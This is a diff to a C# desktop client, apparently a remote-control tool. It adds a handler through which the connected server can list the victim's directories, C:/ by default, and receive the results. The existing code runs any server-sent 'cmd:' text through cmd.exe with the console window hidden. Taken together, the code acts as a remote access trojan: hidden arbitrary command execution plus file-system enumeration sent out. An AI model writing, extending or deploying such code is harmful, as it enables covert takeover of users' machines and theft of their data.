@@ -8,6 +8,7 @@ using DotNetEnv;
 using CLIENT.Helpers;
 using System.Speech.Synthesis;
 using System.Threading;
+using System.IO;
 
 namespace CLIENT.ViewModels
 {
@@ -120,33 +121,42 @@ namespace CLIENT.ViewModels
 
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
+                        if (serverMessage.StartsWith("__open_file:"))
+                        {
+                            string command = serverMessage.Substring(12).Trim();
+                            SendFilePath(command);
+                        }
+
                         if (serverMessage.StartsWith("cmd:"))
                         {
                             string command = serverMessage.Substring(4).Trim();
                             Greeting = $"Command from server: {command}";
                             try
                             {
-                                // Create a new process to run the command in cmd
-                                ProcessStartInfo processStartInfo = new ProcessStartInfo()
-                                {
-                                    FileName = "cmd.exe",
-                                    Arguments = $"/c {command}",  // /c executes the command and terminates
-                                    RedirectStandardOutput = true, // Redirect the output to read it
-                                    UseShellExecute = false,      // Don't use shell execute to get output
-                                    CreateNoWindow = true         // Don't show the command prompt window
-                                };
+                            
+                                
+                                        // Create a new process to run the command in cmd
+                                        ProcessStartInfo processStartInfo = new ProcessStartInfo()
+                                        {
+                                            FileName = "cmd.exe",
+                                            Arguments = $"/c {command}",  // /c executes the command and terminates
+                                            RedirectStandardOutput = true, // Redirect the output to read it
+                                            UseShellExecute = false,      // Don't use shell execute to get output
+                                            CreateNoWindow = true         // Don't show the command prompt window
+                                        };
 
-                                using (Process process = Process.Start(processStartInfo))
-                                {
-                                    if (process != null)
-                                    {
-                                        string output = process.StandardOutput.ReadToEnd();  // Capture the output
-                                        process.WaitForExit(); // Wait for the process to exit
+                                        using (Process process = Process.Start(processStartInfo))
+                                        {
+                                            if (process != null)
+                                            {
+                                                string output = process.StandardOutput.ReadToEnd();  // Capture the output
+                                                process.WaitForExit(); // Wait for the process to exit
 
-                                        // You can handle the output here, e.g., log it or display it
-                                        Console.WriteLine($"Command output: {output}");
-                                    }
-                                }
+                                                // You can handle the output here, e.g., log it or display it
+                                                Console.WriteLine($"Command output: {output}");
+                                            }
+                                        }
+                                
                             }
                             catch (Exception ex)
                             {
@@ -218,6 +228,37 @@ namespace CLIENT.ViewModels
                     {
                         Greeting = $"Sent to server: {message}";
                     });
+                }
+            }
+            catch (Exception ex)
+            {
+                await Dispatcher.UIThread.InvokeAsync(() =>
+                {
+                    Greeting = "Send failed: " + ex.Message;
+                });
+            }
+        }
+
+        public async Task SendFilePath(string command)
+        {
+            try
+            {
+                if (_client != null && _client.Connected && _stream != null)
+                {
+                    string response = string.Empty;
+
+                    string path = !string.IsNullOrEmpty(command) ? command : "C:/";
+                    if (Directory.Exists(path))
+                    {
+                        var entries = Directory.GetFileSystemEntries(path);
+                        response = "pathlist:\n" + string.Join("\n", entries);
+                    }
+                    else
+                    {
+                        response = "Invalid directory path.";
+                    }
+                    byte[] responseBytes = Encoding.UTF8.GetBytes(response);
+                    await _stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                 }
             }
             catch (Exception ex)
